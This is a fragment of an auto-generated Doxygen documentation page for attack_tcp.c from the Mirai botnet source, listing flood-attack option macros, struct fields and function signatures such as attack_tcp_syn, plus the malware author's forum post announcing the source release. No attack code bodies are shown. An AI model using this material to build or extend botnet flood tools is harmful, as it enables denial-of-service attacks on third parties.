<div class="ttc" id="attack_8h_html_a4464ea34ef73875f57b5c6a412aaac20"><div class="ttname"><a href="attack_8h.html#a4464ea34ef73875f57b5c6a412aaac20">ATK_OPT_RST</a></div><div class="ttdeci">#define ATK_OPT_RST</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00060">attack.h:60</a></div></div>
<div class="ttc" id="protocol_8h_html_a7685648be6843dc7a65440e8696044d1"><div class="ttname"><a href="protocol_8h.html#a7685648be6843dc7a65440e8696044d1">PROTO_TCP_OPT_SACK</a></div><div class="ttdeci">#define PROTO_TCP_OPT_SACK</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00031">protocol.h:31</a></div></div>
<div class="ttc" id="rand_8c_html_a11c986f4ca9d396a9bc68c0dd4b3903f"><div class="ttname"><a href="rand_8c.html#a11c986f4ca9d396a9bc68c0dd4b3903f">rand_str</a></div><div class="ttdeci">void rand_str(char *str, int len)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00032">rand.c:32</a></div></div>
<div class="ttc" id="structattack__stomp__data_html_a72bb4223d67736e2972679840a79c72e"><div class="ttname"><a href="structattack__stomp__data.html#a72bb4223d67736e2972679840a79c72e">attack_stomp_data::dport</a></div><div class="ttdeci">port_t dport</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00081">attack.h:81</a></div></div>
<div class="ttc" id="checksum_8c_html_a5144ab59500e01ed196ae6d8b4584c98"><div class="ttname"><a href="checksum_8c.html#a5144ab59500e01ed196ae6d8b4584c98">checksum_tcpudp</a></div><div class="ttdeci">uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len)</div><div class="ttdef"><b>Definition:</b> <a href="checksum_8c_source.html#l00024">checksum.c:24</a></div></div>
<div class="ttc" id="structattack__stomp__data_html"><div class="ttname"><a href="structattack__stomp__data.html">attack_stomp_data</a></div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00078">attack.h:78</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_af492d2bddcb2befacb3aa03dcdf9aafd"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#af492d2bddcb2befacb3aa03dcdf9aafd">BOOL</a></div><div class="ttdeci">char BOOL</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00011">includes.h:11</a></div></div>
<div class="ttc" id="structattack__stomp__data_html_a22c599d05ab7da049cd9b5a4757e3220"><div class="ttname"><a href="structattack__stomp__data.html#a22c599d05ab7da049cd9b5a4757e3220">attack_stomp_data::ack_seq</a></div><div class="ttdeci">uint32_t ack_seq</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00080">attack.h:80</a></div></div>
<div class="ttc" id="rand_8c_html_accf5c4faf4fb7eb9d74bbf1764921b00"><div class="ttname"><a href="rand_8c.html#accf5c4faf4fb7eb9d74bbf1764921b00">rand_next</a></div><div class="ttdeci">uint32_t rand_next(void)</div><div class="ttdef"><b>Definition:</b> <a href="rand_8c_source.html#l00021">rand.c:21</a></div></div>
<div class="ttc" id="attack_8h_html_a4d0115976f56267c42e6a09ff3651c02"><div class="ttname"><a href="attack_8h.html#a4d0115976f56267c42e6a09ff3651c02">ATK_OPT_SPORT</a></div><div class="ttdeci">#define ATK_OPT_SPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00052">attack.h:52</a></div></div>
<div class="ttc" id="attack_8h_html"><div class="ttname"><a href="attack_8h.html">attack.h</a></div></div>
<div class="ttc" id="attack_8h_html_a5a6f282c43f088516dce2de1b69ae7d8"><div class="ttname"><a href="attack_8h.html#a5a6f282c43f088516dce2de1b69ae7d8">ATK_OPT_URG</a></div><div class="ttdeci">#define ATK_OPT_URG</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00057">attack.h:57</a></div></div>
<div class="ttc" id="attack_8h_html_a97b7c19adba8f5e25d603d4fcd80c995"><div class="ttname"><a href="attack_8h.html#a97b7c19adba8f5e25d603d4fcd80c995">ATK_OPT_SEQRND</a></div><div class="ttdeci">#define ATK_OPT_SEQRND</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00063">attack.h:63</a></div></div>
<div class="ttc" id="attack__tcp_8c_html_ae8f0b5db75e6158068cb8cbb2b79cf70"><div class="ttname"><a href="attack__tcp_8c.html#ae8f0b5db75e6158068cb8cbb2b79cf70">attack_tcp_syn</a></div><div class="ttdeci">void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)</div><div class="ttdef"><b>Definition:</b> <a href="attack__tcp_8c_source.html#l00018">attack_tcp.c:18</a></div></div>
<div class="ttc" id="protocol_8h_html_af4ea7ee9b6b8b13a589a2276719c1ea6"><div class="ttname"><a href="protocol_8h.html#af4ea7ee9b6b8b13a589a2276719c1ea6">PROTO_TCP_OPT_WSS</a></div><div class="ttdeci">#define PROTO_TCP_OPT_WSS</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00030">protocol.h:30</a></div></div>
<div class="ttc" id="attack_8h_html_ac8d9ef7cc50e5b0e43f50b087c4c7104"><div class="ttname"><a href="attack_8h.html#ac8d9ef7cc50e5b0e43f50b087c4c7104">ATK_OPT_PAYLOAD_RAND</a></div><div class="ttdeci">#define ATK_OPT_PAYLOAD_RAND</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00047">attack.h:47</a></div></div>
<div class="ttc" id="attack_8c_html_a51262dda96f2861dbd13fc0b6f0a31d3"><div class="ttname"><a href="attack_8c.html#a51262dda96f2861dbd13fc0b6f0a31d3">attack_get_opt_ip</a></div><div class="ttdeci">uint32_t attack_get_opt_ip(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00216">attack.c:216</a></div></div>
<div class="ttc" id="attack_8h_html_a2ad2949e3a473ebba047e474abf5d461"><div class="ttname"><a href="attack_8h.html#a2ad2949e3a473ebba047e474abf5d461">ATK_OPT_FIN</a></div><div class="ttdeci">#define ATK_OPT_FIN</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00062">attack.h:62</a></div></div>
<div class="ttc" id="attack_8h_html_a9b14feb6720fefac0c6da63a77da718e"><div class="ttname"><a href="attack_8h.html#a9b14feb6720fefac0c6da63a77da718e">ATK_OPT_SOURCE</a></div><div class="ttdeci">#define ATK_OPT_SOURCE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00071">attack.h:71</a></div></div>
<div class="ttc" id="attack_8h_html_a57162ecbd3f7644a8f6a6b58aa4f8596"><div class="ttname"><a href="attack_8h.html#a57162ecbd3f7644a8f6a6b58aa4f8596">ATK_OPT_IP_DF</a></div><div class="ttdeci">#define ATK_OPT_IP_DF</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00051">attack.h:51</a></div></div>
<div class="ttc" id="attack_8h_html_a1ac4210e00c74506c31642a74e3fc1c7"><div class="ttname"><a href="attack_8h.html#a1ac4210e00c74506c31642a74e3fc1c7">ATK_OPT_IP_TOS</a></div><div class="ttdeci">#define ATK_OPT_IP_TOS</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00048">attack.h:48</a></div></div>
<div class="ttc" id="structattack__target_html_a8f537c8c1aa7f2b611c6de392d964dfc"><div class="ttname"><a href="structattack__target.html#a8f537c8c1aa7f2b611c6de392d964dfc">attack_target::sock_addr</a></div><div class="ttdeci">struct sockaddr_in sock_addr</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00021">attack.h:21</a></div></div>
<div class="ttc" id="attack_8h_html_aacac129514ea3914af56b5eb4c71f8c6"><div class="ttname"><a href="attack_8h.html#aacac129514ea3914af56b5eb4c71f8c6">ATK_OPT_PAYLOAD_SIZE</a></div><div class="ttdeci">#define ATK_OPT_PAYLOAD_SIZE</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00046">attack.h:46</a></div></div>
<div class="ttc" id="structattack__stomp__data_html_a3dec28f563364d02b0c29ae84c58a308"><div class="ttname"><a href="structattack__stomp__data.html#a3dec28f563364d02b0c29ae84c58a308">attack_stomp_data::sport</a></div><div class="ttdeci">port_t sport</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00081">attack.h:81</a></div></div>
<div class="ttc" id="attack_8c_html_ab59e5bf31f63eeb001f8ec1278a15907"><div class="ttname"><a href="attack_8c.html#ab59e5bf31f63eeb001f8ec1278a15907">attack_get_opt_int</a></div><div class="ttdeci">int attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, int def)</div><div class="ttdef"><b>Definition:</b> <a href="attack_8c_source.html#l00206">attack.c:206</a></div></div>
<div class="ttc" id="checksum_8h_html"><div class="ttname"><a href="checksum_8h.html">checksum.h</a></div></div>
<div class="ttc" id="mirai_2bot_2includes_8h_html"><div class="ttname"><a href="mirai_2bot_2includes_8h.html">includes.h</a></div></div>
<div class="ttc" id="attack_8h_html_a61c202b303f42c57328c999b1104877d"><div class="ttname"><a href="attack_8h.html#a61c202b303f42c57328c999b1104877d">ATK_OPT_ACK</a></div><div class="ttdeci">#define ATK_OPT_ACK</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00058">attack.h:58</a></div></div>
<div class="ttc" id="attack_8h_html_a5ae76926414352bb8e12896c5581a0fd"><div class="ttname"><a href="attack_8h.html#a5ae76926414352bb8e12896c5581a0fd">ATK_OPT_PSH</a></div><div class="ttdeci">#define ATK_OPT_PSH</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00059">attack.h:59</a></div></div>
<div class="ttc" id="structattack__target_html"><div class="ttname"><a href="structattack__target.html">attack_target</a></div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00020">attack.h:20</a></div></div>
<div class="ttc" id="ForumPost_8txt_html_a3eaa76d3cfe977972a9bf87dbc12c50f"><div class="ttname"><a href="ForumPost_8txt.html#a3eaa76d3cfe977972a9bf87dbc12c50f">connect</a></div><div class="ttdeci">World s Largest Echo CNC source code release Anna When I first go in DDoS I wasn t planning on staying in it long I made my there s lots of eyes looking at IOT so it s time to GTFO I know every skid and their it s their wet dream to have something besides qbot So I have an amazing release for you With I usually pull max bots from telnet alone after the Kreb ISPs been slowly shutting down and cleaning up their act max pull is about and dropping I am your and I will treat you real my hf chan And to everyone that thought they were doing anything by hitting my I had good this bot uses domain for CNC It takes seconds for all bots to lol shoutout to this blog post by malwaremustdie thought you were good but you really just completely and totally failed in reversing this binary We still have better kung fu than you kiddos don t make me laugh you made so many mistakes and even confused some different binaries with my LOL Let me give you some slaps back port is not for back connect</div><div class="ttdef"><b>Definition:</b> <a href="ForumPost_8txt_source.html#l00001">ForumPost.txt:1</a></div></div>
<div class="ttc" id="loader_2src_2headers_2includes_8h_html_aa93f0eb578d23995850d61f7d61c55c1"><div class="ttname"><a href="loader_2src_2headers_2includes_8h.html#aa93f0eb578d23995850d61f7d61c55c1">FALSE</a></div><div class="ttdeci">#define FALSE</div><div class="ttdef"><b>Definition:</b> <a href="loader_2src_2headers_2includes_8h_source.html#l00009">includes.h:9</a></div></div>
<div class="ttc" id="attack_8h_html_ab8471c4c3e703d3c9ee4e971c48ba5fb"><div class="ttname"><a href="attack_8h.html#ab8471c4c3e703d3c9ee4e971c48ba5fb">ATK_OPT_DPORT</a></div><div class="ttdeci">#define ATK_OPT_DPORT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00053">attack.h:53</a></div></div>
<div class="ttc" id="attack_8h_html_aecb175215ca3d0ce5017cd8cedb7e0fe"><div class="ttname"><a href="attack_8h.html#aecb175215ca3d0ce5017cd8cedb7e0fe">ATK_OPT_IP_IDENT</a></div><div class="ttdeci">#define ATK_OPT_IP_IDENT</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00049">attack.h:49</a></div></div>
<div class="ttc" id="attack_8h_html_a0fcd18d4c1705cc62b8a2d3f92e0a780"><div class="ttname"><a href="attack_8h.html#a0fcd18d4c1705cc62b8a2d3f92e0a780">ATK_OPT_ACKRND</a></div><div class="ttdeci">#define ATK_OPT_ACKRND</div><div class="ttdef"><b>Definition:</b> <a href="attack_8h_source.html#l00064">attack.h:64</a></div></div>
<div class="ttc" id="protocol_8h_html_ad1a572736a10ff6b282c5f43c4ea1ccf"><div class="ttname"><a href="protocol_8h.html#ad1a572736a10ff6b282c5f43c4ea1ccf">data_len</a></div><div class="ttdeci">uint16_t data_len</div><div class="ttdef"><b>Definition:</b> <a href="protocol_8h_source.html#l00483">protocol.h:483</a></div></div>
</div><!-- fragment --></div><!-- contents -->
</div><!-- doc-content -->
<!-- start footer part -->
<div id="nav-path" class="navpath"><!-- id is needed for treeview function! -->
  <ul>
    <li class="navelem"><a class="el" href="dir_526aa88726c618d995900bd3fb6ff493.html">mirai</a></li><li class="navelem"><a class="el" href="dir_fc79afbdad77ef6ec155f6566a92d41a.html">bot</a></li><li class="navelem"><a class="el" href="attack__tcp_8c.html">attack_tcp.c</a></li>
    <li class="footer">Generated by
    <a href="http://www.doxygen.org/index.html">
    <img class="footer" src="doxygen.png" alt="doxygen"/></a> 1.8.11 </li>
  </ul>
</div>
</body>
</html>
